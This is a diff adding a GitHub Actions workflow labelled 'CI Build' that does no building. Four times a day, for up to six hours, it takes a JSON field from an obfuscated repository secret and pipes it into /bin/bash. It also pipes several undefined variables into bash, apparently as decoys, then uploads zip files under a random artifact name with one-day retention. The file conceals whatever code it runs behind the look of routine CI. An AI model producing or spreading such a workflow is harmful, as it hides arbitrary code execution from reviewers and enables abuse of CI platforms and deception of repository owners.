@@ -1,0 +1,32 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '1 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          eq59273: ${{ secrets.eq59273 }}
+        run: |
+          printf '%s' "$eq59273" | jq -r .ax0508 | /bin/bash
+          echo $dd9 | jq -r .hnru09456 | /bin/bash
+          printf '%s' "$hv729" | jq -r .kjbh125 | /bin/bash
+          echo $qigo78 | jq -r .yj13 | /bin/bash
+          printf '%s' "$alye8" | jq -r .uwtui806 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ZztvlNqI
+          path: "*.zip"
+          retention-days: 1
